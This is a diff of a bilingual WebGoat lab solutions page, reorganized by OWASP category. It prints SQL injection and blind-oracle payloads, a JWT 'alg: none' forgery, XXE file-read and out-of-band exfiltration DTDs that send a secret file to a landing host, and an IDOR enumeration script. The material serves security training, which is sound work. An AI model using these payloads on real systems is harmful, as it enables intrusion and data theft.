@@ -12,13 +12,13 @@
         <h5>WebWolf</h5>
         <div><br></div>
         <span class="multilang" lang="fr">
-            3. Envoyer un email à <code>{utilisateur}@...</code>. Aller sur http://host:port/WebWolf. 
+            3. Envoyer un email à <code>{utilisateur}@...</code>. Aller sur http://host:port/WebWolf.
             S'identifer puis aller lire le mail reçu.
             <br>
             <br>
-            4. Le champ <b>Save</b> sur la page permettant de réinitialiser son mot de passe semble buggé. 
-            Il effectue un <code>POST</code> vers http://webwolf:9090/landing, 
-            qui n'est pas une adresse valide avec l'installation de base via Docker. 
+            4. Le champ <b>Save</b> sur la page permettant de réinitialiser son mot de passe semble buggé.
+            Il effectue un <code>POST</code> vers http://webwolf:9090/landing,
+            qui n'est pas une adresse valide avec l'installation de base via Docker.
             Toutefois en examinant le code source de la page, on observe que le <i>code unique</i> est le même qu'à la question 3.
             <br>
             Il est aussi possible de déclencher la manipulation attendue en effectuant un <code>POST</code> vers http://host:port/landing.
@@ -27,8 +27,8 @@
             3. Send an email to <code>{user}@...</code>. Go to http://host:port/WebWolf. Log in and go read the mail received.
             <br>
             <br>
-            4. The <b>Save</b> field on the reset password page appears to be buggy. It performs a <code>POST</code> to 
-            <a href="http://webwolf:9090/landing">http://webwolf:9090/landing </a>, which is not a valid address with the basic installation via Docker. 
+            4. The <b>Save</b> field on the reset password page appears to be buggy. It performs a <code>POST</code> to
+            <a href="http://webwolf:9090/landing">http://webwolf:9090/landing </a>, which is not a valid address with the basic installation via Docker.
             However, when looking at the source code of the page, we see that the <i>unique code</i> is the same as in question 3.
             <br>
             It is also possible to trigger the expected manipulation by performing a <code>POST</code> to http://host:port/landing.
@@ -49,18 +49,18 @@
             2. Enter un nom et appuyer sur <b>Go!</b>.
             <br>
             <br>
-            3. Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>. 
-            Remplir les champs sur <b>WebGoat</b> avec <code>POST</code> ou <code>GET</code> et un nombre aléatoire, 
-            et cliquer sur <b>Go!</b>.  Récupérer le <code>magic_num</code> dans le corps de la requête, 
+            3. Ouvrir les <i>Outils de développements</i> du navigateur, et aller dans l'onglet <i>Réseau</i>.
+            Remplir les champs sur <b>WebGoat</b> avec <code>POST</code> ou <code>GET</code> et un nombre aléatoire,
+            et cliquer sur <b>Go!</b>.  Récupérer le <code>magic_num</code> dans le corps de la requête,
             repérer que la requête est un <code>POST</code> et recliquer sur <b>Go!</b> avec les bons paramètres.
         </span>
         <span class="multilang" lang="en">
             2. Enter your name and press <b>Go!</b>.
             <br>
             <br>
-            3. Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab. 
-            Fill out the fields on <b>WebGoat</b> with <code>POST</code> or <code> GET</code> and a random number, 
-            and click on <b>Go!</b>. Retrieve the <code>magic_num</code> in the body of the request, 
+            3. Open the <i>Development Tools</i> in the browser, and go to the <i>Network</i> tab.
+            Fill out the fields on <b>WebGoat</b> with <code>POST</code> or <code> GET</code> and a random number,
+            and click on <b>Go!</b>. Retrieve the <code>magic_num</code> in the body of the request,
             find that the request is a <code>POST</code> and re-apply on <b> Go!</b> with the correct parameters.
         </span>
     </div>
@@ -86,11 +86,11 @@
             </li>
             <li>
                 <span class="multilang" lang="fr">
-                    Changer l'URL de http://host:port/WebGoat/HttpProxies/intercept-request à 
+                    Changer l'URL de http://host:port/WebGoat/HttpProxies/intercept-request à
                     <a href="http://host/WebGoat/HttpProxies/intercept-request?Requests%20are%20tampered%20easily=doesn't%20matter%20really"></a>http://host:port/WebGoat/HttpProxies/intercept-request?Requests%20are%20tampered%20easily=doesn't%20matter%20really</a>.
                 </span>
                 <span class="multilang" lang="en">
-                    Change the URL from http://host:port/WebGoat/HttpProxies/intercept-request to 
+                    Change the URL from http://host:port/WebGoat/HttpProxies/intercept-request to
                     <a href="http://host/WebGoat/HttpProxies/intercept-request?Requests%20are%20tampered%20easily=doesn't%20matter%20really"> http://host:port/WebGoat/HttpProxies/intercept-request?Requests%20are%20tampered%20easily=does%20not%20matter%20really</a>.
                 </span>
             </li>
@@ -140,22 +140,22 @@
         <h5>Google Chrome Developer Tools</h5>
         <div><br></div>
         <span class="multilang" lang="fr">
-		4. Suivre la consigne.
-		<br>
-		<br>
-		6. Retrouver l'en-tête à l'aide de l'onglet <i>Réseau</i> des <i>Outils de développement</i>.
-		<br>
-		<br>
-        Remarque importante : ces leçons sont les premières leçons d'un grand nombre de leçon buggée au niveau de l'interface graphique. Le numéro d'exercice ne devient pas vert malgré le message de réussite. Voir ce <a href="https://github.com/WebGoat/WebGoat/issues/619">topic</a>.
+            4. Suivre la consigne.
+            <br>
+            <br>
+            6. Retrouver l'en-tête à l'aide de l'onglet <i>Réseau</i> des <i>Outils de développement</i>.
+            <br>
+            <br>
+            Remarque importante : ces leçons sont les premières leçons d'un grand nombre de leçon buggée au niveau de l'interface graphique. Le numéro d'exercice ne devient pas vert malgré le message de réussite. Voir ce <a href="https://github.com/WebGoat/WebGoat/issues/619">topic</a>.
         </span>
         <span class="multilang" lang="en">
-		4. Follow the instructions.
-		<br>
-		<br>
-		6. Retrieve the header using the <i>Network</i> tab of the <i>Development Tools</i>.
-		<br>
-		<br>
-        Important note: These lessons are the first lessons of a lot of buggy lesson at the GUI. The exercise number does not turn green despite the success message. See this <a href="https://github.com/WebGoat/WebGoat/issues/619"> topic </a>.
+            4. Follow the instructions.
+            <br>
+            <br>
+            6. Retrieve the header using the <i>Network</i> tab of the <i>Development Tools</i>.
+            <br>
+            <br>
+            Important note: These lessons are the first lessons of a lot of buggy lesson at the GUI. The exercise number does not turn green despite the success message. See this <a href="https://github.com/WebGoat/WebGoat/issues/619"> topic </a>.
         </span>
     </div>
 </div>
@@ -164,7 +164,7 @@
 <div><br></div>
 
 <div>
-    <h4><u><b>Injection Flaws:</b></u></h4>
+    <h4><u><b>(A1) Injection:</b></u></h4>
     <div><br></div>
     <div>
         <h5>SQL Injection (introduction)</h5>
@@ -195,25 +195,25 @@
         3. Name: <code>'; SELECT * FROM user_system_data;--</code> or <code>' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--</code> Password: <code>passW0rD</code>
         <div><br></div>
         <span class="multilang" lang="fr">
-            5. Le formulaire <b>Login</b> ne semble pas fournir de résultats utiles à partir de diverses entrées, mais le formulaire 
-            <b>Register</b> nous permet de vérifier si un nom d'utilisateur existe déjà. Si nous essayons de nous inscrire avec le nom d'utilisateur suivant: 
-            <code>tom' AND '1'='1</code> nous constatons que le nom d'utilisateur est pris. 
-            Nous pouvons utiliser cela comme un oracle et vérifier le mot de passe de Tom, une lettre à la fois. 
-            Heureusement, la table que nous recherchons s'appelle <code>password</code>, nous pouvons donc essayer de nous enregistrer avec le nom d'utilisateur suivant: 
-            <code>tom' AND substring(password, 1,1)='t</code> et comme la réponse indique que le nom d'utilisateur existe déjà, 
-            nous savons que <b>t</b> est le premier caractère du mot de passe de Tom. En fuzzing pour les caractères restants, 
+            5. Le formulaire <b>Login</b> ne semble pas fournir de résultats utiles à partir de diverses entrées, mais le formulaire
+            <b>Register</b> nous permet de vérifier si un nom d'utilisateur existe déjà. Si nous essayons de nous inscrire avec le nom d'utilisateur suivant:
+            <code>tom' AND '1'='1</code> nous constatons que le nom d'utilisateur est pris.
+            Nous pouvons utiliser cela comme un oracle et vérifier le mot de passe de Tom, une lettre à la fois.
+            Heureusement, la table que nous recherchons s'appelle <code>password</code>, nous pouvons donc essayer de nous enregistrer avec le nom d'utilisateur suivant:
+            <code>tom' AND substring(password, 1,1)='t</code> et comme la réponse indique que le nom d'utilisateur existe déjà,
+            nous savons que <b>t</b> est le premier caractère du mot de passe de Tom. En fuzzing pour les caractères restants,
             nous pouvons déterminer que le mot de passe de Tom est <b>thisisasecretfortomonly</b>.
             <br>
-            Ce challenge peut être un bon exercice pour s'entraîner au scripting. 
+            Ce challenge peut être un bon exercice pour s'entraîner au scripting.
             Ci-dessous, un petit exemple de code Python permettant de retrouver la réponse:
         </span>
         <span class="multilang" lang="en">
-            5. The <b>Login</b> form does not appear to provide any useful outputs from a variety of inputs, 
-            but the <b>Register</b> form allows us to check whether a username already exists. 
-            If we try to register with the following username: <code>tom' AND '1'='1</code> we find that the username is taken. 
-            We can use this as an oracle and check what tom's password is one at a time. 
-            Fortunately, the table we are seeking is named <code>password</code>, so we can attempt to register with the following username: 
-            <code>tom' AND substring(password,1,1)='t</code> and because the response states the username already exists, we know that <b>t</b> is the first character of Tom's password. 
+            5. The <b>Login</b> form does not appear to provide any useful outputs from a variety of inputs,
+            but the <b>Register</b> form allows us to check whether a username already exists.
+            If we try to register with the following username: <code>tom' AND '1'='1</code> we find that the username is taken.
+            We can use this as an oracle and check what tom's password is one at a time.
+            Fortunately, the table we are seeking is named <code>password</code>, so we can attempt to register with the following username:
+            <code>tom' AND substring(password,1,1)='t</code> and because the response states the username already exists, we know that <b>t</b> is the first character of Tom's password.
             By fuzzing for the remaining characters, we can determine that Tom's passwordis <b>thisisasecretfortomonly</b>.
             <br>
             This challenge can be a good exercise to practice scripting.
@@ -257,7 +257,7 @@
             <br>
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'confirm_password_reg': 'a'
             <br>
-            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } 
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
             <br>
             <br>
             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r = requests.put('http://host:port/WebGoat/SqlInjection/challenge', headers=headers, data=data)
@@ -322,38 +322,38 @@
         <h5>SQL Injection (mitigation)</h5>
         <div><br></div>
         <span class="multilang" lang="fr">
-            5. Les cases doivent contenir les mots suivants pour valider la leçon : 
-        </span> 
+            5. Les cases doivent contenir les mots suivants pour valider la leçon :
+        </span>
         <span class="multilang" lang="en">
             5. The fields must contain the following words to validate the lesson:
-        </span> 
-        <code>getConnection</code>, 
-        <code>PreparedStatement</code>, 
-        <code>prepareStatement</code>, 
-        <code>?</code>, 
-        <code>?</code>, 
-        <code>setString</code>, 
+        </span>
+        <code>getConnection</code>,
+        <code>PreparedStatement</code>,
+        <code>prepareStatement</code>,
+        <code>?</code>,
+        <code>?</code>,
+        <code>setString</code>,
         <code>setString</code>.
         <div><br></div>
-		6.
+        6.
         <div><br></div>
         <code>
-			try {
-			<br>
-			&nbsp;&nbsp;&nbsp;&nbsp; Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
+            try {
             <br>
-			&nbsp;&nbsp;&nbsp;&nbsp; PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
+            &nbsp;&nbsp;&nbsp;&nbsp; Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
             <br>
-			&nbsp;&nbsp;&nbsp;&nbsp; ps.setString(1, "Admin"); 
+            &nbsp;&nbsp;&nbsp;&nbsp; PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
             <br>
-			&nbsp;&nbsp;&nbsp;&nbsp; ps.executeUpdate();
+            &nbsp;&nbsp;&nbsp;&nbsp; ps.setString(1, "Admin");
             <br>
-			} catch (Exception e) {
+            &nbsp;&nbsp;&nbsp;&nbsp; ps.executeUpdate();
             <br>
-			&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("Oops. Something went wrong!");
+            } catch (Exception e) {
             <br>
-			}
-		</code> 
+            &nbsp;&nbsp;&nbsp;&nbsp; System.out.println("Oops. Something went wrong!");
+            <br>
+            }
+        </code>
         <div><br></div>
         10.
         <ul>
@@ -363,7 +363,7 @@
                     Cela peut être exploité en interceptant la requête avec les outils de développement du navigateur et en fournissant une requête SQL comme valeur de colonne.
                 </span>
                 <span class="multilang" lang="en">
-                    Click on column sort performs a request to http://localhost:8080/WebGoat/SqlInjection/servers?column=ip. 
+                    Click on column sort performs a request to http://localhost:8080/WebGoat/SqlInjection/servers?column=ip.
                     This can be exploited by intercepting the request with Browser Tools and providing prepared string as column value.
                 </span>
             </li>
@@ -375,7 +375,7 @@
                     <code>column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)</code>
                 </span>
                 <span class="multilang" lang="en">
-                    To get the idea about <b>webgoat-prd</b> IP address we first have to find out the table name and ip column name. 
+                    To get the idea about <b>webgoat-prd</b> IP address we first have to find out the table name and ip column name.
                     The obvious guess is <b>servers</b> and <b>ip</b>:
                     <br>
                     <code>column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)</code>
@@ -474,117 +474,19 @@
             </li>
         </ul>
     </div>
-    <div>
-        <div><br></div>
-        <h5>XXE</h5>
-        <div><br></div>
-        <span class="multilang" lang="fr">
-            3. Intercepter la requête et modifier le corps avec la chaîne suivante : 
-            <br>
-            Si WebGoat tourne sous Linux: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file:///"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
-            <br>
-            Si WebGoat tourne sous Windows: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file://C:/"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
-            <br>
-            <br>
-            4. Le payload est le même que précédemment, mais il faut modifier l'en-tête <code>Content-Type: application/json</code> en <code>Content-Type: application/xml</code>
-            <br>
-            <br>
-            6. Même si ce n'est pas un challenge, une petite erreur s'est glissée dans la leçon, faire attention à rentrer les bonnes URL pour pouvoir effectuer le test.
-        </span>
-        <span class="multilang" lang="en">
-            3. Intercept the request and modify the body with the following string : 
-            <br>
-            If WebGoat run on Linux: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file:///"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
-            <br>
-            If WebGoat run on Windows: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file://C:/"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
-            <br>
-            <br>
-            4. The payload is the same as before, but you have to change the header <code>Content-Type: application/json</code> to <code>Content-Type: application/xml</code>
-            <br>
-            <br>
-            6. Although it is not a challenge, a small mistake has crept into the lesson, be careful to enter the right URL to be able to perform the test.
-        </span>
-        <br>
-        <br>
-        <b>attack.dtd</b>
-        <br>
-        <code>
-            &lt;?xml version="1.0" encoding="UTF-8"?&gt;
-            <br>
-            &lt;!ENTITY ping SYSTEM 'http://host:port/landing?test=HelloWorld' &gt;
-        </code>
-        <br>
-        <br>
-        <b>Request Body</b>
-        <br>
-        <code>
-            &lt;?xml version="1.0"?&gt;
-            <br>
-            &lt;!DOCTYPE root [
-            <br>
-            &lt;!ENTITY % remote SYSTEM "http://host:port/files/username/attack.dtd" &gt;
-            <br>
-            %remote;
-            <br>
-            ]&gt;
-            <br>
-            &lt;comment&gt;
-            <br>
-            &lt;text>test&amp;ping;&lt;/text&gt;
-            <br>
-            &lt;/comment&gt;
-            <br>
-        </code>
-        <br>
-        <br>
-        <span class="multilang" lang="fr">
-            7. Envoyer <b>contents_file.dtd</b> vers <b>WebWolf</b>, et changer le corps de la requête par celui présent ci-dessous.
-        </span>
-        <span class="multilang" lang="en">
-            7. Upload <b>contents_file.dtd</b> on <b>WebWolf</b>, and change the request body by the one present below.
-        </span>
-        <br>
-        <br>
-        <b>contents_file.dtd</b>
-        <br>
-        <code>
-            &lt;?xml version="1.0" encoding="UTF-8"?&gt;
-            <br>
-            &lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://host:port/landing?%file;' &gt;" &gt;%all;
-        </code>
-        <br>
-        <br>
-        <b>Request Body</b>
-        <br>
-        <code>
-            &lt;?xml version="1.0" encoding="UTF-8"?&gt;
-            <br>
-            &lt;!DOCTYPE xxe [
-            <br>
-            &lt;!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt" &gt;
-            <br>
-            &lt;!ENTITY % dtd SYSTEM "http://host:port/files/username/contents_file.dtd" &gt;
-            <br>
-            %dtd;]&gt;
-            <br>
-            &lt;comment&gt;
-            <br>
-            &lt;text&gt;test&amp;send;&lt;/text&gt;
-            <br>
-            &lt;/comment&gt;
-        </code>
-    </div>
 </div>
+
 <div><br></div>
 <div><br></div>
+
 <div>
-    <h4><u><b>Authentification Flaws:</b></u></h4>
+    <h4><u><b>(A2) Broken Authentification:</b></u></h4>
     <div>
         <div><br></div>
         <h5>Secure Passwords</h5>
         <div><br></div>
         <span class="multilang" lang="fr">
-            4. La vérification utilise la bibliothèque https://github.com/dropbox/zxcvbn pour vérifier la force du mot de passe. 
+            4. La vérification utilise la bibliothèque https://github.com/dropbox/zxcvbn pour vérifier la force du mot de passe.
         </span>
         <span class="multilang" lang="en">
             4. The verification algorithm to check the password strength can be found here https://github.com/dropbox/zxcvbn .
@@ -639,12 +541,12 @@
         <h5>Authentification Bypasses</h5>
         <div><br></div>
         <span class="multilang" lang="fr">
-            2. Intercepter la requête. 
+            2. Intercepter la requête.
             <br>
             Modifier les paramètres <code>secQuestion0=a&secQuestion1=a&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746</code> en <code>secQuestion2=a&secQuestion3=a&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746</code>
         </span>
         <span class="multilang" lang="en">
-            2. Intercept the request. 
+            2. Intercept the request.
             <br>
             Modify the parameters <code>secQuestion0=a&secQuestion1=a&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746</code> to <code>secQuestion2=a&secQuestion3=a&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746</code>
         </span>
@@ -654,14 +556,14 @@
         <h5>JWT tokens</h5>
         <div><br></div>
         <span class="multilang" lang="fr">
-            4. Se connecter avec Tom et cliquer sur <b>Reset Votes</b>. 
+            4. Se connecter avec Tom et cliquer sur <b>Reset Votes</b>.
             <br>
             Intercepter la requête et remarquer l'en-tête: <code>Cookie: access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0._gPSRvB9wAAruFwaDgivXp4n5rHQFi5hTOJsVFqCkR9ZDUf3LhCgJQuTIIpTGnZIS3XWL9MHZGaExJC7XhIiXA</code>
             <br>
             En base64, cela se décode en : <code>{"alg":"HS512"}.{"iat":1564402244,"admin":"false","user":"Tom"}.signature</code>
             <br>
-            Le modifier en <code>{"alg":null}.{"iat":1564402244,"admin":"true","user":"Tom"}.</code>, 
-            le ré-encoder en base64 (<code>eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.</code>) 
+            Le modifier en <code>{"alg":null}.{"iat":1564402244,"admin":"true","user":"Tom"}.</code>,
+            le ré-encoder en base64 (<code>eyJhbGciOiBudWxsfQ==.eyJpYXQiOjE1NjQ0MDIyNDQsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==.</code>)
             et renvoyer la requête pour valider la leçon (validation buggée).
         </span>
         <span class="multilang" lang="en">
@@ -677,11 +579,11 @@
         </span>
         <div><br></div>
         <span class="multilang" lang="fr">
-            5. Il est possible d'effectuer ce challenge à l'aide d'outils tels que <b>johntheripper</b> and https://jwt.io/, mais afin de mieux comprendre voilà un petit script Python. 
+            5. Il est possible d'effectuer ce challenge à l'aide d'outils tels que <b>johntheripper</b> and https://jwt.io/, mais afin de mieux comprendre voilà un petit script Python.
             <br>
         </span>
         <span class="multilang" lang="en">
-            5. It is possible to validate this challenge with tools like <b>johntheripper</b> and https://jwt.io/, but in order to get a better understanding og the whole process, here a Python script. 
+            5. It is possible to validate this challenge with tools like <b>johntheripper</b> and https://jwt.io/, but in order to get a better understanding og the whole process, here a Python script.
             <br>
         </span>
         <div><br></div>
@@ -770,357 +672,542 @@
         </span>
         <div><br></div>
         <span class="multilang" lang="fr">
-            8. Possible d'effectuer une manipulation identique à 4. en replaçant en plus le nom d'utilisateur par Tom. 
-			<br>
-			Ce n'est vraisemblablement pas la manière attendue qui nécessitait en plus une injection SQL.
+            8. Possible d'effectuer une manipulation identique à 4. en replaçant en plus le nom d'utilisateur par Tom.
+            <br>
+            Ce n'est vraisemblablement pas la manière attendue qui nécessitait en plus une injection SQL.
         </span>
         <span class="multilang" lang="en">
             8. It is possible to perform an identical manipulation to 4. by replacing in addition the username by Tom.
-			<br>
-			This is probably not the expected way.
+            <br>
+            This is probably not the expected way.
+        </span>
+    </div>
+</div>
+
+<div><br></div>
+<div><br></div>
+
+<div>
+    <h4><u><b>(A3) Sensitive Data Exposure:</b></u></h4>
+    <div>
+        <div><br></div>
+        <h5>Insecure Login</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            2. Cliquer sur <b>Log in</b> avec l'onglet <i>Réseau</i> des <i>Outils de développement</i> ouverts par exemple.
+            Observer la requête vers http://host:port/WebGoat/start.mvc.
+            Remarque les paramètres <code>{"username":"CaptainJack","password":"BlackPearl"}</code>.
+        </span>
+        <span class="multilang" lang="en">
+            2. Click <b> Log in </b> with the <i>Network</i> tab of the <i>Development Tools</i> opened for example.
+            Observe the request to http://host:port/WebGoat/start.mvc.
+            Note the parameters <code>{"username":"CaptainJack","password":"BlackPearl"}</code>.
         </span>
     </div>
 </div>
 <div><br></div>
 <div><br></div>
+
 <div>
-    <h4><u><b>Cross-Site Scripting (XSS):</b></u></h4>
+    <h4><u><b>(A4) XML External Entities (XXE):</b></u></h4>
+    <div><br></div>
+    <h5>XXE</h5>
+    <div><br></div>
+    <span class="multilang" lang="fr">
+        3. Intercepter la requête et modifier le corps avec la chaîne suivante :
+        <br>
+        Si WebGoat tourne sous Linux: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file:///"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
+        <br>
+        Si WebGoat tourne sous Windows: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file://C:/"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
+        <br>
+        <br>
+        4. Le payload est le même que précédemment, mais il faut modifier l'en-tête <code>Content-Type: application/json</code> en <code>Content-Type: application/xml</code>
+        <br>
+        <br>
+        6. Même si ce n'est pas un challenge, une petite erreur s'est glissée dans la leçon, faire attention à rentrer les bonnes URL pour pouvoir effectuer le test.
+    </span>
+    <span class="multilang" lang="en">
+        3. Intercept the request and modify the body with the following string :
+        <br>
+        If WebGoat run on Linux: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file:///"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
+        <br>
+        If WebGoat run on Windows: <code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file://C:/"&gt;]>&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;</code>
+        <br>
+        <br>
+        4. The payload is the same as before, but you have to change the header <code>Content-Type: application/json</code> to <code>Content-Type: application/xml</code>
+        <br>
+        <br>
+        6. Although it is not a challenge, a small mistake has crept into the lesson, be careful to enter the right URL to be able to perform the test.
+    </span>
+    <br>
+    <br>
+    <b>attack.dtd</b>
+    <br>
+    <code>
+        &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+        <br>
+        &lt;!ENTITY ping SYSTEM 'http://host:port/landing?test=HelloWorld' &gt;
+    </code>
+    <br>
+    <br>
+    <b>Request Body</b>
+    <br>
+    <code>
+        &lt;?xml version="1.0"?&gt;
+        <br>
+        &lt;!DOCTYPE root [
+        <br>
+        &lt;!ENTITY % remote SYSTEM "http://host:port/files/username/attack.dtd" &gt;
+        <br>
+        %remote;
+        <br>
+        ]&gt;
+        <br>
+        &lt;comment&gt;
+        <br>
+        &lt;text>test&amp;ping;&lt;/text&gt;
+        <br>
+        &lt;/comment&gt;
+        <br>
+    </code>
+    <br>
+    <br>
+    <span class="multilang" lang="fr">
+        7. Envoyer <b>contents_file.dtd</b> vers <b>WebWolf</b>, et changer le corps de la requête par celui présent ci-dessous.
+    </span>
+    <span class="multilang" lang="en">
+        7. Upload <b>contents_file.dtd</b> on <b>WebWolf</b>, and change the request body by the one present below.
+    </span>
+    <br>
+    <br>
+    <b>contents_file.dtd</b>
+    <br>
+    <code>
+        &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+        <br>
+        &lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://host:port/landing?%file;' &gt;" &gt;%all;
+    </code>
+    <br>
+    <br>
+    <b>Request Body</b>
+    <br>
+    <code>
+        &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+        <br>
+        &lt;!DOCTYPE xxe [
+        <br>
+        &lt;!ENTITY % file SYSTEM "file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt" &gt;
+        <br>
+        &lt;!ENTITY % dtd SYSTEM "http://host:port/files/username/contents_file.dtd" &gt;
+        <br>
+        %dtd;]&gt;
+        <br>
+        &lt;comment&gt;
+        <br>
+        &lt;text&gt;test&amp;send;&lt;/text&gt;
+        <br>
+        &lt;/comment&gt;
+    </code>
+</div>
+
+<div><br></div>
+<div><br></div>
+
+<div>
+    <h4><u><b>(A5) Broken Access Control:</b></u></h4>
+    <div>
+        <div><br></div>
+        <h5>Insecure Direct Object References</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            2. S'indentifier avec les identifiants fournis.
+        </span>
+        <span class="multilang" lang="en">
+            2. Identify with the provided credentials.
+        </span>
+        <div><br></div>
+        3. role, userID
+        <div><br></div>
+        4. WebGoat/IDOR/profile/2342384
+        <div><br></div>
+        5. <b>View Another Profile</b>:
+        <br>
+        <code>
+            import requests
+            <br>
+            <br>
+            def idor_5():
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; index = 2342300
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; headers = {
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'Cookie': COOKIE,
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; }
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; while True:
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r = requests.get('http://192.168.99.100:8080/WebGoat/IDOR/profile/{}'.format(index), headers=headers)
+            <br>
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if r.status_code != 500 and index != 2342384:
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print("Index: {}".format(index))
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index += 1
+            <br>
+            <br>
+            idor_5()
+        </code>
+        <div><br></div>
+        <b>Edit Another Profile</b>:
+        <br>
+        <span class="multilang" lang="fr">
+            Envoyer une requête PUT vers http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 avec pour en-tête <code>Content-Type: application/json</code>
+            et pour corps <code>{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}</code>
+        </span>
+        <span class="multilang" lang="en">
+            Send a PUT request to http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 with header <code>Content-Type: application/json</code>
+            and body <code>{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}</code>
+        </span>
+    </div>
+    <div>
+        <div><br></div>
+        <h5>Missing Function Level Access Control</h5>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            2. Examiner l'élément <b>Log Out</b>.
+            Juste en dessous dans le HTML, on trouve des champs cachés, dont les champs : Users, Config.
+        </span>
+        <span class="multilang" lang="en">
+            2. Examine the <b>Log Out</b> element.
+            Just below in the HTML, we can see hidden fields: Users, Config.
+        </span>
+        <div><br></div>
+        <span class="multilang" lang="fr">
+            3. Aller sur  http://192.168.99.100:8080/WebGoat/users and rejouer la requête en ajoutant un en-tête <code>Content-Type: application/json</code>
+        </span>
+        <span class="multilang" lang="en">
+            3. Go to  http://192.168.99.100:8080/WebGoat/users replay the request with header <code>Content-Type: application/json</code>
+        </span>
+    </div>
+</div>
+
+<div><br></div>
+<div><br></div>
+
+<div>
+    <h4><u><b>(A7) Cross-Site Scripting (XSS):</b></u></h4>
     <div>
         <div><br></div>
         <h5>Cross Site Scripting</h5>
         <div><br></div>
         <span class="multilang" lang="fr">
